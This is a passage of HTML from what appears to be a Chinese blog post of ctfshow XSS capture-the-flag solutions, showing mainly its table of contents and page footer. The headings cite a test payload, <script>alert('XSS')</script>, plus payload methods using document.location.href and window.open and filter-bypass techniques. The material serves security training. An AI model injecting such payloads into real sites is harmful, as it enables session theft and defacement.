class="toc-number">2.1.2.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E8%AF%AD%E5%8F%A5alert-%E2%80%98XSS%E2%80%99"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">解析语句&lt;script&gt;alert(‘XSS’)&lt;&#x2F;script&gt;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload1-document-location-href"><span class="toc-number">2.1.3.</span> <span class="toc-text">payload1:document.location.href</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload2-window-open"><span class="toc-number">2.1.4.</span> <span class="toc-text">payload2:window.open</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web317"><span class="toc-number">2.2.</span> <span class="toc-text">web317</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4script%E6%A0%87%E7%AD%BE"><span class="toc-number">2.2.1.</span> <span class="toc-text">#过滤script标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#body%E6%A0%87%E7%AD%BE"><span class="toc-number">2.2.2.</span> <span class="toc-text">body标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iframe%E6%A0%87%E7%AD%BE"><span class="toc-number">2.2.3.</span> <span class="toc-text">iframe标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#img%E6%A0%87%E7%AD%BE"><span class="toc-number">2.2.4.</span> <span class="toc-text">img标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web318-319"><span class="toc-number">2.3.</span> <span class="toc-text">web318-319</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E6%A0%87%E7%AD%BE%E8%BF%87%E6%BB%A4"><span class="toc-number">2.3.1.</span> <span class="toc-text">#增加标签过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web320-321"><span class="toc-number">2.4.</span> <span class="toc-text">web320-321</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.4.1.</span> <span class="toc-text">#绕过空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.4.2.</span> <span class="toc-text">绕过空格姿势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%9D%E5%A4%96%E7%9A%84payload"><span class="toc-number">2.4.3.</span> <span class="toc-text">额外的payload:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#js%E4%B8%ADString-fromCharCode-%E6%96%B9%E6%B3%95"><span class="toc-number">2.4.3.1.</span> <span class="toc-text">js中String.fromCharCode()方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%ACascii%E7%A0%81%E8%84%9A%E6%9C%AC"><span class="toc-number">2.4.3.2.</span> <span class="toc-text">字符串转ascii码脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii%E7%A0%81%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%84%9A%E6%9C%AC"><span class="toc-number">2.4.3.3.</span> <span class="toc-text">ascii码转字符串脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web322-326"><span class="toc-number">2.5.</span> <span class="toc-text">web322-326</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4xss"><span class="toc-number">2.5.1.</span> <span class="toc-text">#过滤xss</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web323"><span class="toc-number">2.6.</span> <span class="toc-text">web323</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">3.</span> <span class="toc-text">存储型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web327"><span class="toc-number">3.1.</span> <span class="toc-text">web327</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web328"><span class="toc-number">3.2.</span> <span class="toc-text">web328</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">3.2.1.</span> <span class="toc-text">预期解:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web329"><span class="toc-number">3.3.</span> <span class="toc-text">web329</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&text=web入门xss篇--ctfshow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&title=web入门xss篇--ctfshow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&is_video=false&description=web入门xss篇--ctfshow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web入门xss篇--ctfshow&body=Check out this article: https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&title=web入门xss篇--ctfshow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&title=web入门xss篇--ctfshow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&title=web入门xss篇--ctfshow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&title=web入门xss篇--ctfshow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&name=web入门xss篇--ctfshow&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&t=web入门xss篇--ctfshow"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
